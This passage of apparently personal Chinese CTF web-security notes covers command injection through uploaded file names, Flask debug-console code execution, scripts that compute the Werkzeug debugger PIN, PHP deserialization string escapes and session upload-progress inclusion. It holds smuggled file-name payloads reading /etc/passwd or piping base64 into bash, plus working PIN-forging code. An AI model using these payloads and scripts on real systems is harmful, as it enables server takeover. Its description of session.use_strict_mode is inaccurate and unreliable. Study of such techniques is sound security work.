<p>&#x3D;&#x3D;&gt;所以如果存在一个环境，会将上传的zip文件自动解压，或者会将上传文件进行检测并把上传文件文件名包含在命令中，并且没有加上引号限制字符类型</p>
</blockquote>
<p>比如</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip -oq <span class="regexp">/tmp/</span>xx -d <span class="regexp">/home/</span></span><br><span class="line">or</span><br><span class="line">cat <span class="regexp">/tmp/</span>xx </span><br></pre></td></tr></table></figure>

<p>那么猜测如果文件名为</p>
<blockquote>
<p>1;cat &#x2F;etc&#x2F;passwd;zip</p>
</blockquote>
<p>那么执行时，就会导致</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip -oq <span class="regexp">/tmp/</span><span class="number">1</span>;</span><br><span class="line">cat <span class="regexp">/etc/</span>passwd;</span><br><span class="line">.zip -d <span class="regexp">/home/</span></span><br></pre></td></tr></table></figure>

<p>就实现了上传文件达到RCE的目的，并且这些命令大都是以root权限执行的命令，所以操作性极大，危害极大，实际环境应注意这些用户可控的数据数据不能不经过处理并入任何命令中去</p>
<hr>
<p>当然实际环境下命令大都可能会因为一些原因被过滤或者无法执行，亦或者是内容无法回显，可以考虑将其转换为其他编码类型，并将回显内容导入到其他文件中去，再来执行</p>
<blockquote>
<p>1;echo L2ZsYWcgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9mbGFnLnR4dA&#x3D;&#x3D;|base64 -d|bash;.zip</p>
<p>#echo &#x2F;flag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;flag.txt</p>
</blockquote>
<h1 id="Flask的Debug模式"><a href="#Flask的Debug模式" class="headerlink" title="Flask的Debug模式"></a>Flask的Debug模式</h1><p>在比赛时，看到有道题大佬一直在说看看<code>flask</code>的<code>debug</code>开启没，记录学习一下</p>
<p>使用 Flask 开发过程中存在两个常见的问题：</p>
<blockquote>
<ol>
<li>当 Flask 程序出错时，没有提示错误的详细信息；</li>
<li>修改 Flask 源代码后需要重启 Flask 程序。</li>
</ol>
</blockquote>
<p>debug模式开启的代码就是</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>) <span class="comment">#这里就是开启debug模式</span></span><br></pre></td></tr></table></figure>

<p>运行时，显示输出也会显示debug模式开启</p>
<blockquote>
<p>$ python3 debug.py</p>
<ul>
<li>Serving Flask app “debug” (lazy loading)</li>
<li>Environment: production</li>
<li><code>Debug mode: on</code></li>
<li>Restarting with stat</li>
<li>Debugger is active!</li>
<li>Debugger PIN: 316-471-540</li>
<li>Running on <a target="_blank" rel="noopener" href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> (Press CTRL+C to quit)</li>
</ul>
</blockquote>
<p>开启后，当程序运行错误时，网站页面就会将错误点所在代码显示，并且给出错误原因以及修正方案</p>
<p>而如果不开启debug模式，显示的结果就不会显示错误原因</p>
<p><img src="/2023/02/15/Notes/image-20230615002937536.png" alt="image-20230615002937536"></p>
<p>而开启后就是</p>
<p><img src="/2023/02/15/Notes/image-20230615002956862.png" alt="image-20230615002956862"></p>
<p>而修改的话，也不用退出程序，重新加载</p>
<p>直接修改代码，然后保存，就会成功修改并且自行重启，并且不会影响程序的正常运行，程序输出也会显示程序已修改</p>
<p><img src="/2023/02/15/Notes/image-20230615003317118.png" alt="image-20230615003317118"></p>
<h2 id="利用debug功能能干啥"><a href="#利用debug功能能干啥" class="headerlink" title="利用debug功能能干啥"></a>利用debug功能能干啥</h2><p>flask在debug模式下会生成一个debugger pin，并且多次重启flask服务，PIN码不会改变</p>
<p><img src="/2023/02/15/Notes/image-20230615134425055.png" alt="image-20230615134425055"></p>
<p>通过PIN码可以进入python的交互式shell</p>
<p>如</p>
<p><img src="/2023/02/15/Notes/image-20230615134634288.png" alt="image-20230615134634288"></p>
<p>这里<code>1/0</code>报错</p>
<p>点击后，右边就会显示一个终端的图标，点击后，需要提供PIN码，然后便可以进入交互式shell</p>
<p><img src="/2023/02/15/Notes/image-20230615134831790.png" alt="image-20230615134831790"></p>
<p>查看当前目录下文件</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">result = subprocess.run(<span class="string">&#x27;dir&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/15/Notes/image-20230615135711738.png" alt="image-20230615135711738"></p>
<p>而服务器端的请求头</p>
<blockquote>
<p>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:30] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;import%20subprocess&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:35] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;result%20%3D%20subprocess.run(‘dir’,%20shell%3DTrue,%20stdout%3Dsubprocess.PIPE)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:40] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;output%20%3D%20result.stdout.decode(‘gbk’)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:45] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;print(output)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -</p>
</blockquote>
<p>所以可以看到，启动debug在公开环境下，是非常不安全的，不仅用户可以看到你的代码内容，而且如果当前flask服务的PIN码泄露，还会造成被攻击者远程执行命令等一系列恶意操作</p>
<p>但是也不容易实现这个条件</p>
<p><img src="/2023/02/15/Notes/image-20230617144803167.png" alt="image-20230617144803167"></p>
<p>因为PIN rce实现是需要设置cookie头的，而且实际进行时会发现 PIN RCE 无法进行<code>CRLF</code>拆分注入，因为它根本不解析回车换行，只能一行行进行输入，所以很难实现</p>
<h2 id="PIN-码如何生成"><a href="#PIN-码如何生成" class="headerlink" title="PIN 码如何生成"></a>PIN 码如何生成</h2><p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>
<p>在</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(debug = <span class="literal">True</span>)app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码敲断点，发现了<code>get_pin_and_cookie_name</code>函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    Pin was explicitly disabled</span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line">​</span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line">​</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">​</span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>

<p><strong>生成要素：</strong></p>
<blockquote>
<p>username<br>通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd<br>引用<br>modname<br>通过getattr(mod,“file”,None)读取，默认值为flask.app<br>引用<br>appname<br>通过getattr(app,“name”,type(app).name)读取，默认值为Flask<br>引用<br>moddir<br>当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取<br>引用<br>uuidnode<br>通过uuid.getnode()读取，通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算<br>引用<br>machine_id<br>每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：</p>
<p>1.&#x2F;etc&#x2F;machine-id (&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</p>
<p>2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p>3.&#x2F;proc&#x2F;self&#x2F;cgroup</p>
</blockquote>
<blockquote>
<p><strong>不同版本算法区别</strong><br>3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同</p>
</blockquote>
<h3 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h3><p>3.6 MD5</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">​</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>3.8 SHA-1</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">​</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><blockquote>
<p>变短吸收后面，变长挤掉后面</p>
<p>s:5:”12345”中</p>
<p>5是说明也是限制，后面的5个字符都属于字符串</p>
<p>s:5:”1234””中</p>
<p>1234”也算是字符串，”不起闭合作用</p>
<ol>
<li><p>如变长</p>
<blockquote>
<p>x-&gt;yy</p>
<p>s:6:”xxxxxx”</p>
<p>filter后</p>
<p>s:6:”yyyyyyyyyyyy”(反序列化会报错)</p>
</blockquote>
<p>所以修改一下filter前的</p>
<blockquote>
<p>s:6:”xxx”;}”</p>
<p>其中字符串为xxx”;} 这6个，但是当x-&gt;yy后，xxx变长为6位xxxxxx</p>
<p>s:6:”yyyyyy”;}”</p>
<p>字符串就为yyyyyy了，<code>&quot;;&#125;</code>就实现了成功逃逸，将语句闭合，当然逃逸数据可以修改，长度刚好为变长部分长度</p>
</blockquote>
</li>
<li><p>如变短</p>
<blockquote>
<p>xx-&gt;y</p>
<p>s:6:”xxxxxx”;}O:5</p>
<p>filter后</p>
<p>s:6:”yyy”;}O:5(反序列化会报错)</p>
</blockquote>
<p>所以修改一下filter前的</p>
<blockquote>
<p>s:18:”<code>xxxxxxxxxxxxxxxxxx</code>“;s:23:”<code>a&quot;;&#125;O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>“;}O:5</p>
<p>其中字符串为这16个，但是当xx-&gt;y后，xxxxxxxxxxxxxxxxxx变短为9位xxxxxxxxx</p>
<p>s:18:”<code>yyyyyyyyy&quot;;s:23:&quot;a</code>“;}O:4:{s:4:”hacker”;}”;}O:5</p>
<p>字符串就为<code>yyyyyyyyy&quot;;s:23:&quot;a</code>了，</p>
<p>而;}就将其闭合了，而后<code>O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>就逃出来了</p>
<p>变短就是数一下后面需要吞掉截断的字符串到其最后一个引号的字符个数，要是filter数据长度的一半</p>
</blockquote>
</li>
</ol>
</blockquote>
<h1 id="session进行文件包含"><a href="#session进行文件包含" class="headerlink" title="session进行文件包含"></a>session进行文件包含</h1><blockquote>
<p><code>session包含需要session打开，没打开怎么办，页面没有session</code></p>
</blockquote>
<h2 id="session-upload-progress作用？"><a href="#session-upload-progress作用？" class="headerlink" title="session.upload_progress作用？"></a><code>session.upload_progress</code>作用？</h2><blockquote>
<p><code>session.upload_progress.enabled</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.cleanup</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.prefix</code> &#x3D; “<strong>upload_progress_</strong>“</p>
<p><code>session.upload_progress.name</code> &#x3D; “<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>“</p>
</blockquote>
<blockquote>
<p><code>session.upload_progress.enabled</code>可以控制是否开启session.upload_progress功能</p>
<p><code>session.upload_progress.cleanup</code>可以控制是否在上传之后删除文件内容</p>
<p><code>session.upload_progress.prefix</code>可以设置上传文件内容的前缀</p>
<p><code>session.upload_progress.name</code>的值即为session中的键值</p>
</blockquote>
<p>session.upload_progress开启之后，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传</p>
<p>进度等)存储在session当中。</p>
<p><strong>初始化session</strong></p>
<p><code>session.use_strict_mode</code>是一个PHP配置选项，它指定了在使用cookie存储会话ID时是否启用严格模式。当启用严格模式时，会话</p>
<p>ID只能通过HTTPS连接传输，并且不能通过URL参数传递。这可以防止会话劫持攻击。如果未启用严格模式，则会话ID可以通过HTTP连</p>
<p>接传输，并且可以通过URL参数传递。这可能会导致会话劫持攻击。默认情况下，<code>session.use_strict_mode</code>设置为0（禁用）</p>
<h1 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h1><blockquote>
<p>学习文章</p>
<p><a target="_blank" rel="noopener" href="https://j-kangel.github.io/2019/04/05/hash-attack/">hash长度扩展攻击 | KANGEL (j-kangel.github.io)</a></p>
</blockquote>
<blockquote>
<p>Hash长度拓展攻击（Length Extension Attack）是一种针对特定类型哈希算法的攻击技术。哈希算法是一种将任意大小的数据转换成固定大小哈希值（通常是一串十六进制字符）的算法。这些哈希值通常用于校验数据完整性和验证数据的唯一性。</p>
<p>在正常情况下，哈希算法的输出长度是固定的，而且算法是不可逆的，意味着从哈希值恢复原始数据是非常困难的。但是，由于一些哈希算法的设计问题，存在一种被称为“Hash长度拓展攻击”的漏洞。</p>
